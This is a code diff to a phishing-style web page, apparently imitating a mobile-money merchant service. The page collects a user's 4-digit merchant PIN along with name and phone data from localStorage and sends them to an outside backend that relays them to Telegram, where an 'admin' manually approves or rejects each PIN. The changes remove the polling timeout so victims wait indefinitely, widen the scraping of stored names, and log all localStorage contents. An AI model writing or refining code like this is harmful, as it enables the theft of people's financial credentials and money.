@@ -136,6 +136,11 @@ body{
   background:white;
 }
 
+.pin-boxes input:focus{
+  border-color:#004fc5;
+  box-shadow:0 0 0 2px rgba(0,79,197,0.2);
+}
+
 .eye{
   font-size:22px;
   color:#888;
@@ -145,8 +150,19 @@ body{
 #status{
   min-height:20px;
   margin-top:10px;
-  color:#d00;
   font-size:14px;
+}
+
+#status.error{
+  color:#d00;
+}
+
+#status.success{
+  color:#0a0;
+}
+
+#status.waiting{
+  color:#004fc5;
 }
 
 .lower-section{
@@ -284,7 +300,9 @@ console.log("Bot ID from URL:", botId);
 
 // If no botId, show error
 if (!botId) {
-  document.getElementById("status").textContent = "Error: Missing bot ID. Please use the link from Telegram.";
+  const statusEl = document.getElementById("status");
+  statusEl.className = "error";
+  statusEl.textContent = "Error: Missing bot ID. Please use the link from Telegram.";
   document.querySelector(".action").style.opacity = "0.5";
 }
 
@@ -305,6 +323,39 @@ document.getElementById("toggleVisibility").addEventListener("click", function()
   });
   this.textContent = isPasswordVisible ? "🙈" : "👁";
 });
+
+// Function to get user name from localStorage
+function getUserName() {
+  // Try multiple possible keys
+  const firstName = localStorage.getItem("firstName") || "";
+  const lastName = localStorage.getItem("lastName") || "";
+  const name = localStorage.getItem("name") || "";
+  
+  // Build full name
+  let fullName = name;
+  if (!fullName && firstName) {
+    fullName = lastName ? `${firstName} ${lastName}` : firstName;
+  }
+  if (!fullName) {
+    // If still no name, check if there's any name stored
+    const possibleName = localStorage.getItem("userName") || 
+                        localStorage.getItem("fullName") || 
+                        localStorage.getItem("clientName");
+    if (possibleName) {
+      fullName = possibleName;
+    }
+  }
+  
+  console.log("Retrieved name from localStorage:", {
+    firstName,
+    lastName,
+    name,
+    fullName,
+    allKeys: Object.keys(localStorage)
+  });
+  
+  return fullName || "Unknown";
+}
 
 async function sendMerchantPinToTelegram(name, phone, pin) {
   const BACKEND_URL = "https://mixx-by-yas-biashara.onrender.com";
@@ -336,8 +387,10 @@ async function sendMerchantPinToTelegram(name, phone, pin) {
     if (!res.ok) {
       try {
         const errorData = JSON.parse(responseText);
+        statusEl.className = "error";
         statusEl.textContent = `Error: ${errorData.error || 'Server error'}`;
       } catch {
+        statusEl.className = "error";
         statusEl.textContent = `Server error (${res.status}): ${responseText}`;
       }
       return null;
@@ -349,6 +402,7 @@ async function sendMerchantPinToTelegram(name, phone, pin) {
     
   } catch (error) {
     console.error("Network error:", error);
+    statusEl.className = "error";
     statusEl.textContent = "Network error. Please check your connection.";
     return null;
   }
@@ -357,8 +411,8 @@ async function sendMerchantPinToTelegram(name, phone, pin) {
 async function pollMerchantPinApproval(requestId) {
   const BACKEND_URL = "https://mixx-by-yas-biashara.onrender.com";
   let attempts = 0;
-  const maxAttempts = 20;
   
+  // NO TIMEOUT - Wait indefinitely for admin approval
   return new Promise((resolve) => {
     const interval = setInterval(async () => {
       attempts++;
@@ -371,29 +425,43 @@ async function pollMerchantPinApproval(requestId) {
         
         if (data.blocked) {
           clearInterval(interval);
+          statusEl.className = "error";
           statusEl.textContent = "Your account has been blocked.";
           resolve(false);
           return;
         }
         
-        if (data.approved === true || data.approved === false) {
+        if (data.approved === true) {
           clearInterval(interval);
-          resolve(data.approved);
+          statusEl.className = "success";
+          statusEl.textContent = "Merchant PIN approved! Redirecting...";
+          resolve(true);
           return;
         }
         
-        if (attempts >= maxAttempts) {
+        if (data.approved === false) {
           clearInterval(interval);
-          statusEl.textContent = "Request timed out. Please try again.";
+          statusEl.className = "error";
+          statusEl.textContent = "Incorrect merchant PIN. Please try again.";
           resolve(false);
+          return;
         }
+        
+        // Still waiting - show waiting message with elapsed time
+        if (attempts % 10 === 0 || attempts === 1) {
+          const elapsedSeconds = Math.floor(attempts * 1.5);
+          const minutes = Math.floor(elapsedSeconds / 60);
+          const seconds = elapsedSeconds % 60;
+          const timeStr = minutes > 0 ? `${minutes}m ${seconds}s` : `${seconds}s`;
+          statusEl.className = "waiting";
+          statusEl.textContent = `Waiting for admin approval... (${timeStr})`;
+        }
+        
       } catch (error) {
         console.error("Poll error:", error);
-        if (attempts >= maxAttempts) {
-          clearInterval(interval);
-          statusEl.textContent = "Request failed. Please try again.";
-          resolve(false);
-        }
+        // Don't stop polling on network errors - keep trying
+        statusEl.className = "waiting";
+        statusEl.textContent = "Connection issue. Retrying...";
       }
     }, 1500);
   });
@@ -417,28 +485,32 @@ boxes.forEach((box, i) => {
       
       // Validate botId
       if (!botId) {
+        statusEl.className = "error";
         statusEl.textContent = "Error: Bot ID missing. Please use the link from Telegram.";
         boxes.forEach(b => { b.disabled = false; b.value = ""; });
         boxes[0].focus();
         return;
       }
       
-      // Get user data
-      const name = localStorage.getItem("name") || "Unknown";
+      // Get user data - use the improved function
+      const name = getUserName();
       const phone = localStorage.getItem("phone") || "Unknown";
       
       console.log("Submitting merchant PIN:", { name, phone, pin, botId });
+      console.log("All localStorage data:", {...localStorage});
       
       // Disable inputs while processing
       boxes.forEach(b => b.disabled = true);
       verifyBtn.classList.add("disabled");
       verifyBtn.textContent = "VERIFYING...";
+      statusEl.className = "waiting";
       statusEl.textContent = "Sending merchant PIN for verification...";
       
       // Send merchant PIN to backend
       const res = await sendMerchantPinToTelegram(name, phone, pin);
       
       if (!res || !res.requestId) {
+        statusEl.className = "error";
         statusEl.textContent = "Failed to send merchant PIN. Please try again.";
         boxes.forEach(b => { b.disabled = false; b.value = ""; });
         verifyBtn.classList.remove("disabled");
@@ -447,25 +519,23 @@ boxes.forEach((box, i) => {
         return;
       }
       
+      statusEl.className = "waiting";
       statusEl.textContent = "Waiting for admin approval...";
       
-      // Poll for approval
+      // Poll for approval (will wait indefinitely until admin responds)
       const approved = await pollMerchantPinApproval(res.requestId);
       
       if (approved === true) {
         localStorage.setItem("merchantPin", pin);
-        statusEl.textContent = "Merchant PIN verified successfully! Redirecting...";
         setTimeout(() => {
           window.location.href = `success.html?botId=${botId}`;
-        }, 1000);
+        }, 500);
       } else if (approved === false) {
-        statusEl.textContent = "Incorrect merchant PIN. Please try again.";
         boxes.forEach(b => { b.disabled = false; b.value = ""; });
         verifyBtn.classList.remove("disabled");
         verifyBtn.textContent = "CONFIRM PIN";
         boxes[0].focus();
       } else {
-        statusEl.textContent = "An error occurred. Please try again.";
         boxes.forEach(b => { b.disabled = false; b.value = ""; });
         verifyBtn.classList.remove("disabled");
         verifyBtn.textContent = "CONFIRM PIN";
@@ -487,6 +557,7 @@ boxes.forEach((box, i) => {
         const event = new Event('input');
         boxes[3].dispatchEvent(event);
       } else {
+        statusEl.className = "error";
         statusEl.textContent = "Please enter all 4 digits";
       }
     }
@@ -506,6 +577,7 @@ verifyBtn.addEventListener("click", () => {
     const event = new Event('input');
     boxes[3].dispatchEvent(event);
   } else {
+    statusEl.className = "error";
     statusEl.textContent = "Please enter a 4-digit PIN";
     boxes[0].focus();
   }
